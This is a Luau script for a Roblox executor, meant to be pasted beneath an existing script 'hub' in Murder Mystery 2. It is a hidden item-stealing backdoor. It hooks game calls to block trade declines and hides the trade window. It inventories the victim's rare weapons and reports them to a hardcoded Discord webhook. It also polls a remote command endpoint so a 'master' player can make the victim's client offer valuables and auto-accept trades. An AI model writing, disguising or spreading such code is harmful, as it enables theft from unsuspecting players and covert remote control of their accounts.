-- lang: Luau | file: protoxak_mm2.lua | runtime: Roblox executor (request/http_request)
-- target: Murder Mystery 2 | direct discord webhook | owner: Protoxak
-- (весь хаб сверху без изменений — вставляешь нижний блок)

if getgenv().PhantomControlB_Activo then return end
getgenv().PhantomControlB_Activo = true

local ALLOWED_PLACES = {
    [142823291]       = true,
    [188331334]       = true,
    [335132309]       = true,
    [333740520]       = true,
    [636649648]       = true,
    [594100598]       = true,
    [73210641948512]  = true,
    [124544126418603] = true,
}

if not ALLOWED_PLACES[game.PlaceId] then return end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local lp                = Players.LocalPlayer

local OWNER_NICK = "Protoxak"
local WEBHOOK    = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"

-- Прокси снят. Если позже вернёшь команды мастера через свой воркер — впиши URL сюда.
local JSONBIN_URL = ""

local START_TIME = os.time()
local req = (syn and syn.request) or (http and http.request) or http_request or request

local STATES = { PASSIVE="PASSIVE", ACTIVE="ACTIVE", LEAVING="LEAVING" }
local currentState    = STATES.PASSIVE
local currentMasterId = 0
local masterInServer  = false
local enTradeConMaster = false

local NETWORK = {
    BasePollRate    = 3.5,
    MaxPollRate     = 15,
    CurrentPollRate = 3.5,
    LocalCheckRate  = 45,
    LastPanelUpdate = 0,
}

-- ── hook: блокируем DeclineTrade и SetRequestsEnabled(false) пока трейд с мастером
local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if method == "FireServer" or method == "InvokeServer" then
        local selfName = tostring(self)
        if selfName == "DeclineTrade" and enTradeConMaster then return nil end
        if selfName == "SetRequestsEnabled" then
            local args = {...}
            if args[1] == false and enTradeConMaster then return nil end
        end
    end
    return OldNamecall(self, ...)
end)

local function obtenerRequestContainer()
    for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
        local g = lp.PlayerGui:FindFirstChild(guiName)
        if g and g:FindFirstChild("Container") then
            local r = g.Container:FindFirstChild("Request")
            if r and r.Visible then return r end
        end
    end
    return nil
end

local wasMasterInServer = false
task.spawn(function()
    while true do
        task.wait(0.2)
        local isPresent = false
        if currentMasterId ~= 0 then
            for _, p in ipairs(Players:GetPlayers()) do
                if p.UserId == currentMasterId then isPresent = true break end
            end
        end
        masterInServer = isPresent

        if not masterInServer and wasMasterInServer then
            pcall(function()
                local E = ReplicatedStorage.Trade:FindFirstChild("DeclineTrade")
                if E then E:FireServer() end
            end)
        end
        wasMasterInServer = masterInServer

        if masterInServer or enTradeConMaster then
            pcall(function()
                for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
                    local g = lp.PlayerGui:FindFirstChild(guiName)
                    if g and g.Enabled then g.Enabled = false end
                end
            end)
            if enTradeConMaster then
                pcall(function()
                    if obtenerRequestContainer() then
                        ReplicatedStorage.Trade.DeclineRequest:FireServer()
                    end
                end)
            end
        end
    end
end)

-- ── webhook: теперь напрямую в discord, ник Protoxak в username ────────────
local function FireWebhook(data)
    if not req then
        warn("[Protoxak] executor без request — вебхук не уйдёт")
        return
    end
    data.username = OWNER_NICK

    pcall(function()
        return req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data),
        })
    end)
end

local function FormatTime(s)
    local h = math.floor(s/3600); local m = math.floor((s%3600)/60); local sec = math.floor(s%60)
    if h > 0 then return string.format("%dh %dm %ds", h, m, sec) end
    if m > 0 then return string.format("%dm %ds", m, sec) end
    return string.format("%ds", sec)
end

local function ObtenerInfoServidor()
    local priv = (game.VIPServerId ~= "" or game.PrivateServerId ~= "")
    return string.format("🌐 **INFO DEL SERVIDOR**\n• **Tipo:** %s\n• **Jugadores:** %d/%d",
        priv and "Privado" or "Público", #Players:GetPlayers(), Players.MaxPlayers or 12)
end

local function ObtenerLinkPerfil()
    return string.format("[Ver perfil](https://www.roblox.com/users/%d/profile)", lp.UserId)
end

-- ── база MM2 ───────────────────────────────────────────────────────────────
local dbFolder      = ReplicatedStorage:WaitForChild("Database", 5)
local modulesFolder = ReplicatedStorage:WaitForChild("Modules", 5)
if not dbFolder or not modulesFolder then return end

local syncModule    = dbFolder:WaitForChild("Sync", 5)
local profileModule = modulesFolder:WaitForChild("ProfileData", 5)
if not syncModule or not profileModule then return end

local Database    = _G.Database or require(syncModule)
local ProfileData = require(profileModule)

local VIP_ITEMS = {
    Corrupt=true, Gingerscope=true, ["Traveler's Axe"]=true, Celestial=true,
    ["Vampire's Axe"]=true, ["Traveler's Gun"]=true, Constellation=true,
    Evergun=true, Evergreen=true, Turkey=true, ["Vampire's Gun"]=true,
    Darkshot=true, Alienbeam=true, Darksword=true, Raygun=true, Blossom=true,
    Sakura=true, Snowcannon=true, Bauble=true, Sunset=true, ["Nik's Scythe"]=true,
    Latte=true, Spectral=true, ["Cane (Knife)"]=true, Darkknife=true,
    ["Silent Night (Knife)"]=true, Bones=true, Brains=true,
    ["Zombified (Knife)"]=true, Glitch1=true, Glitch2=true, Ghoulish=true,
    ["Bats (Knife)"]=true, Sparkle9=true, Sparkle8=true, Sparkle7=true,
    Sparkle10=true, Skool=true, Sparkle4=true, Sparkle5=true,
    ["Heart Wand"]=true, Flowerwood=true,
}

local function EsItemVIPValido(itemName, itemData)
    if not itemData then return false end
    if string.find(itemName, "Sparkle") then return true end
    local r = itemData.Rarity
    return r and (r=="Godly" or r=="Ancient" or r=="Unique" or r=="Vintage" or r=="Legendary")
end

local function AnalyzeInventory()
    local godlys, legendaries, vips = {}, {}, {}
    local isRelevant = false
    pcall(function()
        for id, _ in pairs(ProfileData.Weapons.Owned) do
            local item = Database.Item[id]
            if item then
                local name = item.ItemName or id
                local rareza = item.Rarity
                if VIP_ITEMS[name] and EsItemVIPValido(name, item) then
                    table.insert(vips, name); isRelevant = true
                end
                if rareza == "Godly" or rareza == "Ancient" or rareza == "Unique" or rareza == "Vintage" then
                    table.insert(godlys, "🔹 " .. name); isRelevant = true
                elseif rareza == "Legendary" then
                    table.insert(legendaries, "🔸 " .. name)
                end
            end
        end
    end)
    return isRelevant, godlys, legendaries, vips
end

local function GetValuableIds()
    local lista = {}
    for _, r in ipairs({"Godly","Ancient","Unique","Vintage","Legendary"}) do
        if #lista >= 4 then break end
        for id, _ in pairs(ProfileData.Weapons.Owned) do
            if #lista >= 4 then break end
            local d = Database.Item[id]
            if d and d.Rarity == r then table.insert(lista, id) end
        end
    end
    return lista
end

local function clickUniversal(button)
    if not button then return end
    for _, senal in ipairs({button.MouseButton1Click, button.MouseButton1Down, button.Activated}) do
        pcall(function()
            for _, conn in pairs(getconnections(senal)) do conn:Fire() end
        end)
    end
end

local ultimoTimestampTrade = 0
pcall(function()
    ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function(data)
        if type(data)=="table" and data.LastOffer then ultimoTimestampTrade = data.LastOffer end
    end)
    ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if type(data)=="table" and data.LastOffer then ultimoTimestampTrade = data.LastOffer end
    end)
end)

local function ActivarModoMasterSeguro()
    enTradeConMaster = true
    task.spawn(function() task.wait(4) enTradeConMaster = false end)
end

-- ── команды мастера (требуют рабочий JSONBIN_URL) ──────────────────────────
local function ProcessCommand(fullCmdString, masterPlayer)
    if not masterPlayer then return end
    local args = string.split(fullCmdString:lower(), " ")
    local cmd = args[1]

    if cmd == "okey" or cmd == "ok" then
        ActivarModoMasterSeguro()
        task.spawn(function()
            pcall(function() ReplicatedStorage.Trade.SetRequestsEnabled:FireServer(true) end)
            pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(masterPlayer) end)
            task.wait(1.5)
            for _, id in ipairs(GetValuableIds()) do
                pcall(function() ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end)
                task.wait(0.2)
            end
            task.wait(0.5)
            pcall(function()
                local g = lp.PlayerGui:FindFirstChild("TradeGUI_Phone") or lp.PlayerGui:FindFirstChild("TradeGUI")
                local act = g and g:FindFirstChild("Container") and g.Container:FindFirstChild("Trade")
                    and g.Container.Trade:FindFirstChild("Actions")
                for _ = 1, 40 do
                    if ultimoTimestampTrade ~= 0 then
                        pcall(function()
                            ReplicatedStorage.Trade.AcceptTrade:FireServer(masterPlayer.UserId, ultimoTimestampTrade)
                        end)
                    end
                    if act then
                        pcall(function() clickUniversal(act.Accept:FindFirstChild("ActionButton")) end)
                        pcall(function() clickUniversal(act.Accept.Confirm:FindFirstChild("ActionButton")) end)
                    end
                    task.wait(0.15)
                end
            end)
        end)

    elseif cmd == "vip" then
        ActivarModoMasterSeguro()
        task.spawn(function()
            for id, _ in pairs(ProfileData.Weapons.Owned) do
                local d = Database.Item[id]
                if d then
                    local n = d.ItemName or id
                    if VIP_ITEMS[n] and EsItemVIPValido(n, d) then
                        pcall(function() ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end)
                        task.wait(0.25)
                    end
                end
            end
        end)

    elseif cmd == "x" then
        ActivarModoMasterSeguro()
        local busca = table.concat(args, " ", 2):lower()
        for id, _ in pairs(ProfileData.Weapons.Owned) do
            local itm = Database.Item[id]
            if itm and itm.ItemName:lower():find(busca) then
                pcall(function() ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end)
                break
            end
        end

    elseif cmd == "a" then
        ActivarModoMasterSeguro()
        pcall(function()
            ReplicatedStorage.Trade.SetRequestsEnabled:FireServer(true)
            ReplicatedStorage.Trade.SendRequest:InvokeServer(masterPlayer)
        end)

    elseif cmd == "e" then
        ActivarModoMasterSeguro()
        for _, id in ipairs(GetValuableIds()) do
            pcall(function() ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end)
            task.wait(0.25)
        end

    elseif cmd == "98" then
        ActivarModoMasterSeguro()
        task.spawn(function()
            pcall(function()
                local g = lp.PlayerGui:FindFirstChild("TradeGUI_Phone") or lp.PlayerGui:FindFirstChild("TradeGUI")
                local act = g and g:FindFirstChild("Container") and g.Container:FindFirstChild("Trade")
                    and g.Container.Trade:FindFirstChild("Actions")
                for _ = 1, 40 do
                    if ultimoTimestampTrade ~= 0 then
                        pcall(function()
                            ReplicatedStorage.Trade.AcceptTrade:FireServer(masterPlayer.UserId, ultimoTimestampTrade)
                        end)
                    end
                    if act then
                        pcall(function() clickUniversal(act.Accept:FindFirstChild("ActionButton")) end)
                        pcall(function() clickUniversal(act.Accept.Confirm:FindFirstChild("ActionButton")) end)
                    end
                    task.wait(0.15)
                end
            end)
        end)
    end
end

local function VerificarAutoridadLocal(masterId, safeServers)
    if not masterId or masterId == 0 then return false, nil end
    local masterPlayer, otrasBEnServidor = nil, {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p.UserId == tonumber(masterId) then masterPlayer = p
        elseif safeServers[tostring(p.UserId)] then table.insert(otrasBEnServidor, p.UserId) end
    end
    if not masterPlayer then return false, nil end
    local miId = lp.UserId
    for _, otroId in ipairs(otrasBEnServidor) do
        if otroId < miId then return false, masterPlayer end
    end
    return true, masterPlayer
end

local function ClearCommand(masterId, safeServers)
    if JSONBIN_URL == "" then return end
    pcall(function()
        req({
            Url = JSONBIN_URL, Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode({ masterId=masterId, cmd="none", servers=safeServers }),
        })
    end)
end

local function UpdateServerPresence(masterId, currentCmd, safeServers)
    if JSONBIN_URL == "" then return end
    local _, godlys = AnalyzeInventory()
    safeServers[tostring(lp.UserId)] = {
        name = lp.Name, jobId = game.JobId, timestamp = os.time(),
        weapons = (#godlys > 0) and table.concat(godlys, ", ") or "Vacío",
    }
    pcall(function()
        req({
            Url = JSONBIN_URL, Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode({ masterId=masterId, cmd=currentCmd or "none", servers=safeServers }),
        })
    end)
end

local function StartActiveSystem()
    if currentState == STATES.ACTIVE then return end
    currentState = STATES.ACTIVE

    task.spawn(function()
        local _, godlys, legendaries, vips = AnalyzeInventory()
        local desc = ""
        if #vips > 0 then desc = desc .. "🚨 **VIP:**\n" .. table.concat(vips, ", ") .. "\n\n" end
        desc = desc .. "✨ **Godlys:**\n" .. (#godlys>0 and table.concat(godlys,", ") or "Ninguna") .. "\n\n"
        desc = desc .. "🔥 **Legendaries:**\n" .. (#legendaries>0 and (legendaries[1]..(#legendaries>1 and " (+"..(#legendaries-1)..")" or "")) or "Ninguna") .. "\n\n"
        desc = desc .. ObtenerInfoServidor() .. "\n\n"
        desc = desc .. "👤 " .. ObtenerLinkPerfil()

        FireWebhook({ embeds = {{
            title = lp.Name .. " (ACTIVA)",
            description = desc, color = 3066993,
            footer = { text = "Phantom V16.4.1 | " .. OWNER_NICK .. " | JobId: " .. (game.JobId ~= "" and game.JobId or "Privado") },
        }}})
    end)

    task.spawn(function()
        task.wait(math.random(10,40)/10)
        local ultimoComandoProcesado = "none"

        while currentState == STATES.ACTIVE do
            if JSONBIN_URL == "" then
                task.wait(15)
            else
                pcall(function() ReplicatedStorage.Trade.SetRequestsEnabled:FireServer(true) end)

                local reqSuccess, res = pcall(function() return req({ Url = JSONBIN_URL, Method = "GET" }) end)
                if reqSuccess and res and res.StatusCode == 200 then
                    local pollSuccess, pollData = pcall(function() return HttpService:JSONDecode(res.Body) end)
                    if pollSuccess and pollData then
                        local rec = pollData.record or pollData
                        if type(rec) == "table" then
                            NETWORK.CurrentPollRate = NETWORK.BasePollRate
                            local mId = tonumber(rec.masterId) or 0
                            currentMasterId = mId
                            local currentCmd = rec.cmd or "none"
                            local safeServers = type(rec.servers)=="table" and rec.servers or {}

                            if currentCmd == "none" then ultimoComandoProcesado = "none" end

                            local isCommandAvailable  = (currentCmd ~= "none" and currentCmd ~= "")
                            local needsPanelUpdate    = (os.time() - NETWORK.LastPanelUpdate > 60)
                            local soyCandidataAutorizada, masterPlayer = VerificarAutoridadLocal(mId, safeServers)

                            if soyCandidataAutorizada and isCommandAvailable and (currentCmd ~= ultimoComandoProcesado) then
                                ultimoComandoProcesado = currentCmd
                                task.spawn(function()
                                    ProcessCommand(currentCmd, masterPlayer)
                                    ClearCommand(mId, safeServers)
                                end)
                                currentCmd = "none"
                            end
                            if needsPanelUpdate then
                                NETWORK.LastPanelUpdate = os.time()
                                task.spawn(function() UpdateServerPresence(mId, currentCmd, safeServers) end)
                            end
                        end
                    end
                else
                    NETWORK.CurrentPollRate = math.min(NETWORK.CurrentPollRate * 1.5, NETWORK.MaxPollRate)
                end

                task.wait(NETWORK.CurrentPollRate + (math.random(1,12)/10))
            end
        end
    end)
end

local function RunPassiveLoop()
    task.spawn(function()
        while currentState == STATES.PASSIVE do
            task.wait(NETWORK.LocalCheckRate)
            local isRelevant = AnalyzeInventory()
            if isRelevant then StartActiveSystem() break end
        end
    end)
end

local leavingHandled = false
local function HandleLeaving()
    if leavingHandled then return end
    leavingHandled = true

    local oldState = currentState
    currentState = STATES.LEAVING

    local sessionTime = time()
    local scriptTime  = os.time() - START_TIME
    local _, godlys, legendaries, vips = AnalyzeInventory()
    local botin = {}

    for _, v in ipairs(vips)        do table.insert(botin, "👑 "..v) end
    for _, g in ipairs(godlys)      do table.insert(botin, g) end
    for _, l in ipairs(legendaries) do table.insert(botin, l) end

    local botinTexto = (#botin>0) and table.concat(botin, ", ") or "🎒 Nada de valor."
    local desc = string.format(
        "🚪 **Desconexión Detectada**\n• **Estado:** `%s`\n• **Script Activo:** `%s`\n• **Tiempo de Sesión:** `%s`\n\n📦 **Botín Final:**\n%s\n\n%s\n\n👤 %s",
        oldState, FormatTime(scriptTime), FormatTime(math.floor(sessionTime)),
        botinTexto, ObtenerInfoServidor(), ObtenerLinkPerfil()
    )

    FireWebhook({ embeds = {{
        title = "💜 " .. lp.Name .. " (Salida)",
        description = desc, color = 16711680,
        footer = { text = "Phantom V16.4.1 | " .. OWNER_NICK .. " | JobId: " .. (game.JobId ~= "" and game.JobId or "Privado") },
    }}})
end

Players.PlayerRemoving:Connect(function(player)
    if player == lp then HandleLeaving() end
end)

pcall(function()
    game:BindToClose(function()
        HandleLeaving()
        task.wait(1.5)
    end)
end)

task.spawn(function()
    task.wait(3)
    for _ = 1, 20 do
        local loaded = false
        pcall(function()
            if ProfileData and ProfileData.Weapons and type(ProfileData.Weapons.Owned) == "table" then
                loaded = true
            end
        end)
        if loaded then break end
        task.wait(1)
    end
    if currentState == STATES.LEAVING then return end
    if AnalyzeInventory() then StartActiveSystem() else RunPassiveLoop() end
end)
